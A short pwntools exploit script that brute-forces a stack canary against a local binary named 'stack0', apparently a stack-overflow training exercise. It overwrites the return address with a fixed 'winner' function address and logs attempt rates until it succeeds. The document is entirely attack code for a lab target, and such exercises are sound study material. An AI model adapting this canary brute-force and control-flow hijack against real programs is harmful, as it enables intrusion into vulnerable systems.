
# original exploit

import sys
from pwn import *
from random import randint
from time import time
from datetime import timedelta


context(aslr=True)

start_timestamp = time()
latest_timestamp = start_timestamp
all_count = 0
period_count = 0
winner = pack(0x080484cc)
while True:
    canary = pack(randint(0, 16777216) << 8)
    payload = winner*16 + canary + b"LLLL"

    p = process("stack0")
    p.sendline(payload)

    out = p.recvuntil([b"modified", b"smash"])
    p.kill()

    if b"modified" in out:
        sys.stderr.write(stdout+"\n")
        sys.stderr.write("we did it boiz (attempt #%d)..\n" % all_count)
        exit()
    all_count += 1
    period_count += 1

    if all_count%100 == 0:
        now = time()
        sys.stderr.write("attempts: %d | speed: %dp/s | elapsed: %s\n" % (all_count, period_count/(now-latest_timestamp), timedelta(seconds=now-start_timestamp)))
        latest_timestamp = now
        period_count = 0


